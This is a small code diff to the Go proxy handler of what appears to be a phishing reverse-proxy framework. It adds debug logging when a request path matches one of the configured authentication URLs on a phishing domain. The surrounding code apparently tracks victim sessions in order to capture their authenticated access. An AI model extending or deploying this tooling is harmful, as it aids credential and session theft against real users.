@@ -838,6 +838,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if ok && !s.IsDone {
 						for _, au := range pl.authUrls {
 							log.Debug("auth_url: %s try match %s", au.String(), req.URL.Path)
+							ismatch := au.MatchString(req.URL.Path)
+							if ismatch {
+								log.Debug("auth_url: %s matched %s", au.String(), req.URL.Path)
+							}
 							if au.MatchString(req.URL.Path) {
 								// set Access url for session
 								accessUrl := p.genAccessUrl(ps.PhishDomain)
